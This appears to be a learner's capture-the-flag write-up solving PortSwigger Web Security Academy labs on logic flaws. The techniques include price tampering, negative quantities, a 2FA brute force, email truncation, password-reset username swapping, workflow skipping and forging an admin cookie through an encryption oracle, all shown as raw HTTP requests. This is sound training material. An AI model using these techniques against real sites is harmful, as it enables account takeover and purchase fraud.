# Business logic vulnerabilities
https://portswigger.net/web-security/logic-flaws

# https://portswigger.net/web-security/logic-flaws/examples
https://portswigger.net/web-security/logic-flaws/examples

# ***1. Lab: Excessive trust in client-side controls***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

To solve the lab, buy a "Lightweight l33t leather jacket". 

add the item to cart and find the request in burp:
    POST /cart HTTP/1.1
    Host: 0a9c002a04b87e35c0d67b0d00ce0043.web-security-academy.net
    Cookie: session=LGMwHDwHNZB47FAVYui4ALNCh8OVxcTC
    Content-Length: 48


    productId=1&redir=PRODUCT&quantity=1&price=133700

change the price to 100 (which translates to 1$)

    productId=1&redir=PRODUCT&quantity=1&price=100

enter to the cart - now we have enpough funds - make the purchse

# 1337 own!

# ***2. Lab: 2FA broken logic***
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

To solve the lab, access Carlos's account page. 

**start login process and observe requests:**
1. initiate process:
    GET /login HTTP/1.1

2. send username and password:
    POST /login HTTP/1.1

    username=wiener&password=peter

3. initate mfa process:
    GET /login2 HTTP/1.1

4. send mfa pin code recieve by email:
    POST /login2 HTTP/1.1
    Cookie: session=hb0XBJWhxcjHxyHrQ353WaRe6k6LH9Le; verify=wiener


    mfa-code=1234

- note that username value can be changed 
- note there is no limit on how many failed attempts - so brute force is possible.

**Attack:**
send **POST /login2 HTTP/1.1** to intruder at change username to carlos and mark the pincode as variable. go to payload and choose numbers 0 to 9999 in steps of 1. 
initiate attack and look for **HTTP/1.1 302 Found**


# ***3.Lab: High-level logic vulnerability***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

To solve the lab, buy a "Lightweight l33t leather jacket". 

login and add the 1337 jacket to cart. find request:
    POST /cart HTTP/1.1

    productId=1&quantity=1&redir=CART

remove it from cart - observe request:
    POST /cart HTTP/1.1

    productId=1&quantity=-1&redir=CART

we sse quantity field recieves negative numbers. send request with negative value again and observe cart total is -1337$. try to **place order** and observe error message: 

Cart total price cannot be less than zero 

add items in total value of 1338$ - 1436$ (so Cart value will be between 1$ to 100$ - our **store credit**)

place order again - observe success!



# ***4. Lab: Low-level logic flaw***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level

To solve the lab, buy a "Lightweight l33t leather jacket"

Hint: you will need to use Burp Intruder (or Turbo Intruder) to solve this lab.

To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the Maximum concurrent requests option. 

1. observe a maximum cap of 99 units per request. test for more limits by using intruder (with *NULL payload* in **payload set**) to spam the 99 units requests. 
    POST /cart HTTP/1.1

    productId=1&quantity=99&redir=CART

2. wait a small internity and observe that after reaching **2,147,483,647**$ the back-end system is reaching a limit ( = the largest value that a signed 32-bit integer field can hold) - and do the most rational thing it can do: make the number a negative number and continue counting toward zero.

3. wait until it reaches a small positive number, smaller than your balance (you can use cheaper objects from home page to achieve it) and make the purchase.

4. good luck getting 64,247 jackets from vendor!

# 1337!

# ***5.Lab: Inconsistent handling of exceptional input***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input

To solve the lab, access the admin panel and delete Carlos. 

Hint: You can use the link in the lab banner to access an email client connected to your own private mail server. The client will display all messages sent to @YOUR-EMAIL-ID.web-security-academy.net and any arbitrary subdomains. Your unique email ID is displayed in the email client.

try: **GET /admin HTTP/1.1** 
response:
    Admin interface only available if logged in as a DontWannaCry user 

in **GET /admin HTTP/1.1** we see thaanother hint:
    If you work for DontWannaCry, please use your @dontwannacry.com email address 

lets try combinations of **[user]@dontwannacry.com** with our exploit server:

admin@dontwannacry.com.exploit-0a7f001b036de3b5c0cd1de901590004.exploit-server.net

admin.dontwannacry.com@exploit-0a7f001b036de3b5c0cd1de901590004.exploit-server.net



lets try a too-long address attack:
    123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789hundred123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789tentwohundred123456789ten123456789ten123456789ten123456789twohunderdandfifty@exploit-0a14003003dc51c5c1e6bb4c015c0014.exploit-server.net

valiadte account with token sent to email. enter my-account and see thata email was shorten to:
    123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789hundred123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789tentwohundred123456789ten1


so now we can prepare a payload that will get to our email server and get shotened into another email with **@dontwannacry.com** suffix:
1. change the last 17 letter of the shortened email with the suffix)
2. add the exploit server suffix (remember the dot to make it a subdomain) **.exploit-0a14003003dc51c5c1e6bb4c015c0014.exploit-server.net**
    123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789hundred123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789tentwohun@dontwannacry.com.exploit-0a14003003dc51c5c1e6bb4c015c0014.exploit-server.net

3. when we enter to our account we see the email has become:
    123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789hundred123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789ten123456789tentwohun@dontwannacry.com

4. and we also see the admin panel link now we can delete carlos

# great!

# ***6. Lab: Inconsistent security controls***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls

To solve the lab, access the admin panel and delete Carlos

register to the site (with the email validation) and login
change the email to an email with **attacker@dontwannacry.com** and observe **Admin panel** link apears -  enter and delete carlos

# done


# ***7. Lab: Weak isolation on dual-use endpoint***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

To solve the lab, access the administrator account and delete Carlos. 

login and observe **GET /my-account HTTP/1.1** and oserve there is a password reset form at **POST /my-account/change-password HTTP/1.1** . use form to change try and change administrator password - with arbitary value for **current-password** field. fail as expected.

in repeater send the form again - this time without the **current-password** *parameter name* and *value*. 

observe message of successful password change. 

login as administrator and delelt carlos

# ta-da!

# ***8. Lab: Password reset broken logic***
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

preform password change process (including mfa via email client). on last step, before sending the new password - turn **intercept on**

observe in request the a field with user name: 

    POST /forgot-password?temp-forgot-password-token=3XypYvDyu4Ma0KuV56AhxM7aYRbd7AjC HTTP/1.1
    Host: 0a9800f3038c8bbcc098488000f4006a.web-security-academy.net
    Cookie: session=Sf3ftjXp1MVVnmXCGqpHY4AlOQ4gbIgW


    temp-forgot-password-token=3XypYvDyu4Ma0KuV56AhxM7aYRbd7AjC&username=wiener&new-password-1=123&new-password-2=123

change username to carlos and finish process. login as carlos with the new password

# done!

# ***9. Lab: 2FA simple bypass***
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass

login as Wiener and study password reset process.

preform the password reset with carlos credential and when asked for the mfa, simply ignore it and go to **GET /my-account HTTP/1.1** instead.
observe that you are logged0in as carlos. 

# WIN!

# ***10. Lab: Insufficient workflow validation***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation

To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacke&t". 

login and preform a buy on an objects to study the purchase process. observe the 2 final stages:
1. checkout:
    POST /cart/checkout HTTP/1.1

    csrf=2D2cK3oXRz41FgxeZgeDDK7k4x0m6Uta

2. order confirmation:
    GET /cart/order-confirmation?order-confirmed=true HTTP/1.1

send order confirmation to repeater.

preform the purchse process for item "1337 jacket" and instead of "place order" (the **POST /cart/checkout HTTP/1.1** request ) skip to the **order-confirmation** request. observe lab solved

# 1337!


# ***11. Lab: Authentication bypass via flawed state machine***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine

This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete Carlos. 

login and study process.
observe after **POST /login HTTP/1.1** there is an extra step of defining role: user / content-author. the step has **GET /role-selector HTTP/1.1** and **POST /role-selector HTTP/1.1** (with param) requests.

logout and restart login process, with intercept on.
when **GET /role-selector HTTP/1.1** is intercepted - drop the request (effectivley waiving the role selecting). navigate to **GET /my-account HTTP/1.1** and notice role defaulted to administrator (observe Admin panel)

delete carlos

# great

# ***12. Lab: Flawed enforcement of business rules*** 
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules

 To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket". 

notice coupons:
NEWCUST5 - in the header
SIGNUP30 - after signing to newslater in the footer

notice when trying to double submit a coupon it recognise coupon was used already. also note that you can double discount with 2 coupons (fault logic #1) and that you can stack coupon on top of each other, as long as its criss-crossed:
    Name 	                             Price 	 Quantity 	
    Lightweight "l33t" Leather Jacket 	$1337.00 	1 	
    SIGNUP30	                        -$401.10		
    NEWCUST5	                        -$5.00		
    SIGNUP30	                        -$401.10		
    NEWCUST5	                        -$5.00		
    SIGNUP30	                        -$401.10		
    NEWCUST5	                        -$5.00		
    SIGNUP30	                        -$401.10	

# styled!

# ***13. Lab: Infinite money logic flaw***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket". 

observe the 30% discount coupon:
SIGNUP30

observe the 10$ gift card - cost 7$ after discount. 
after buying the gist we get an code (format: *9WLyUYvjkv*) that can be redeemed at the home page.

we will start by buying 14 units of 10$ cards at discounted price of 100$, redeem them into 140$ and buy more discounted cards. in this way we will accumulate the 935$ required to but the 1337 jacket (after discount)

to automate the redeeming process - we can copy the codes list from the purchase receipt and load it to intruder's simple list payload and mark the redeem field parameter.

after about 7 rounds we have enough funds to purchase the jacket

# l33t!


# ***14. Lab: Authentication bypass via encryption oracle***
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle

To solve the lab, exploit this flaw to gain access to the admin panel and delete Carlos. 

login with stay-logged checked.
observe cookie:
    Cookie: session=sXu61vAUHocY9q9GOaF3HIFuAcN0cCze; stay-logged-in=aCX5TpwgI%2bpOG9KJtCOwkvirvOkpBuowWzka3Zj7HXs%3d

<!-- learned:
changing email dont change stay-logged cookie
cookie changes everytime we logout and login again
formar cookies workes - but not very old cookies (maybe date dependant)
stay-logged cookie works independant to the session cookie
when login in twice in very shot time (2-3 seconds apart) we can see similarity in cookie:
pIaGwbYrNbce6E2m7L58BPF12wnlDnFOpxAQrwaNlzM
pIaGwbYrNbce6E2m7L58BEXG9seKOjMdZ5hod5bR5W0 -->

# stage 1 - recon and examin site

explore the site, use all sites functions as intended and with worng parameters. observe error messege in response to **GET /post?postId=1 HTTP/1.1**:
    <header class="notification-header">
    Invalid email address: test
    </header>

further examine reveals a nofification cookie whic holds an encrypted value. the cookie seems to be generated in the previous request-response duo: 
**request**: 
    POST /post/comment HTTP/1.1
    Host: 0a5b00da04569b41c038185700f8001d.web-security-academy.net
    Cookie: session=6FtcrqtkeFIarqwSnGLXmkTVu6esh1V3; stay-logged-in=P798xvzFcvsN%2bS3lEt%2fU15tZPkplHd%2foTIs8tHVdqsI%3d


    csrf=aG5maB079Qth67DaVQrcUheUqSkJ74OO&postId=1&comment=test&name=test&email=test&website=

**response**:
    HTTP/1.1 302 Found
    Location: /post?postId=1
    Set-Cookie: notification=BgnqYqcmptBMvH%2fQJVQOtEvs7MEURkyBsA8n112NgbQ%3d; HttpOnly

so it seems the "Invalid email address: test" was generated, encoded and transfered via the notification cookie, and then decrypted and served to the user as message on the next page.

this feature is actually an encryption-decryption mechanism that allows us to decrypt our own payload in the right format for the server:

**POST /post/comment HTTP/1.1**
- email field = input plain text
- nofication cookie in reponse = ourput encrypted

**GET /post?postId=1 HTTP/1.1**
- Cookie: notification= input encrypted
- notification-header message = outpout plain text

# stage 2 

decrypt the stay-logged cookie:
**stay-logged-in=P798xvzFcvsN%2bS3lEt%2fU15tZPkplHd%2foTIs8tHVdqsI%3d**

copy **P798xvzFcvsN%2bS3lEt%2fU15tZPkplHd%2foTIs8tHVdqsI%3d** into **GET /post?postId=1 HTTP/1.1** and observe the plain text output:
```js
    <header class="notification-header">
    wiener:1665938269942
    </header>
```
as expected the value includes user information (constant) and timestamp (everchanging).

# stage 3

craft our own paylod (keeping the timestamp as is):
    administrator:1665938269942

load the plaintext value to the encrypting request, in the email value:
**request:**
    POST /post/comment HTTP/1.1

    csrf=aG5maB079Qth67DaVQrcUheUqSkJ74OO&postId=1&comment=test&name=test&email=administrator:1665938269942&website=

**response:**
    HTTP/1.1 302 Found
    Location: /post?postId=1
    Set-Cookie: notification=BgnqYqcmptBMvH%2fQJVQOtKb1a%2b7roTkHmFv7OoJMHYdHovAzXtkRZbb5EF%2bYZnOO8%2bg0o5tygwnyQj8eabjAIw%3d%3d; 

lets validate we got a correct cookie by decrypting it:

**request:**
    GET /post?postId=1 HTTP/1.1
    Host: 0a5b00da04569b41c038185700f8001d.web-security-academy.net
    Cookie: notification=BgnqYqcmptBMvH%2fQJVQOtKb1a%2b7roTkHmFv7OoJMHYdHovAzXtkRZbb5EF%2bYZnOO8%2bg0o5tygwnyQj8eabjAIw%3d%3d; session=6FtcrqtkeFIarqwSnGLXmkTVu6esh1V3; stay-logged-in=P798xvzFcvsN%2bS3lEt%2fU15tZPkplHd%2foTIs8tHVdqsI%3d

**response:**
```htm
    <header class="notification-header">
    Invalid email address: administrator:1665938269942
    </header>
```

we need to cut the invalid email prefix, added as default to our message by our improvised encoder:
    Invalid email address: administrator:1665938269942

original:
    BgnqYqcmptBMvH%2fQJVQOtKb1a%2b7roTkHmFv7OoJMHYdHovAzXtkRZbb5EF%2bYZnOO8%2bg0o5tygwnyQj8eabjAIw%3d%3d

urldecoded:
    BgnqYqcmptBMvH/QJVQOtKb1a+7roTkHmFv7OoJMHYdHovAzXtkRZbb5EF+YZnOO8+g0o5tygwnyQj8eabjAIw==

base64 decoded (shoe in hex foramt for ease of manipulating)
    00000000	06	09	ea	62	a7	26	a6	d0	4c	bc	7f	d0	25	54	0e	b4		êb§&¦ÐL¼Ð%T´
    00000010	a6	f5	6b	ee	eb	a1	39	07	98	5b	fb	3a	82	4c	1d	87	¦õkîë¡9[û:L
    00000020	47	a2	f0	33	5e	d9	11	65	b6	f9	10	5f	98	66	73	8e	G¢ð3^Ùe¶ù_fs
    00000030	f3	e8	34	a3	9b	72	83	09	f2	42	3f	1e	69	b8	c0	23	óè4£r	òB?i¸À#

delete 23 first chars (the length of "Invalid email address: " prefix):
    00000000	07	98	5b	fb	3a	82	4c	1d	87	47	a2	f0	33	5e	d9	11	[û:LG¢ð3^Ù
    00000010	65	b6	f9	10	5f	98	66	73	8e	f3	e8	34	a3	9b	72	83	e¶ù_fsóè4£r
    00000020	09	f2	42	3f	1e	69	b8	c0	23	--	--	--	--	--	--	--		òB?i¸À#

encode to base64 and to url and check decryption to validate our cookie.
note error mesage:

```htm
        <h4>Internal Server Error</h4>
        <p class=is-warning>Input length must be multiple of 16 when decrypting with padded cipher</p>
```

another hint to allow us to better build the cookie. add padding and do the process again so the prefix to be removed is exacly 32 byte long (which will make our cookie encoding start at the next 16 or 32 byte block). so 32 byte - 23 byte in existing prefix = 9 byte to be added to our cookie:

# stage 3 with padding:
xxxxxxxxxadministrator:1665938269942

encoded:
Vre7Ny%2bl3BnH8RS54z6pRDlWaVnneUausQgH%2f6dGsykJgkpwKsCZWw08%2fMbRZJnv7Ska0tqZgsY9df4vQ5bdNg%3d%3d

decoded:
    <header class="notification-header">
    Invalid email address: xxxxxxxxxadministrator:1665938269942                    

our cookie encrypted correctly - lets send to decoder to remove prefix:
    Vre7Ny%2bl3BnH8RS54z6pRDlWaVnneUausQgH%2f6dGsykJgkpwKsCZWw08%2fMbRZJnv7Ska0tqZgsY9df4vQ5bdNg%3d%3d
url-decoded:
    Vre7Ny+l3BnH8RS54z6pRDlWaVnneUausQgH/6dGsykJgkpwKsCZWw08/MbRZJnv7Ska0tqZgsY9df4vQ5bdNg==
base64 decoded:
    00000000	56	b7	bb	37	2f	a5	dc	19	c7	f1	14	b9	e3	3e	a9	44	V·»7/¥ÜÇñ¹ã>©D
    00000010	39	56	69	59	e7	79	46	ae	b1	08	07	ff	a7	46	b3	29	9ViYçyF®±ÿ§F³)
    00000020	09	82	4a	70	2a	c0	99	5b	0d	3c	fc	c6	d1	64	99	ef		Jp*À[    <üÆÑdï
    00000030	ed	29	1a	d2	da	99	82	c6	3d	75	fe	2f	43	96	dd	36	í)ÒÚÆ=uþ/CÝ6

after 32 byte removed from prefix:
    00000000	09	82	4a	70	2a	c0	99	5b	0d	3c	fc	c6	d1	64	99	ef		Jp*À[    <üÆÑdï
    00000010	ed	29	1a	d2	da	99	82	c6	3d	75	fe	2f	43	96	dd	36	í)ÒÚÆ=uþ/CÝ6
base64 encoded:
    CYJKcCrAmVsNPPzG0WSZ7+0pGtLamYLGPXX+L0OW3TY=
url-encoded:
    CYJKcCrAmVsNPPzG0WSZ7%2b0pGtLamYLGPXX%2bL0OW3TY%3d

response:
    <header class="notification-header">
    administrator:1665938269942
    </header>

we have a logged-in cookie!

# Attck:

logout of wiener and send a **GET / HTTP/1.1** with new session to repeater. insert crafted stay-logged cookie and send request. observe in response you are logged in as administrator.

delete carlos

# Encrypton is supercool!

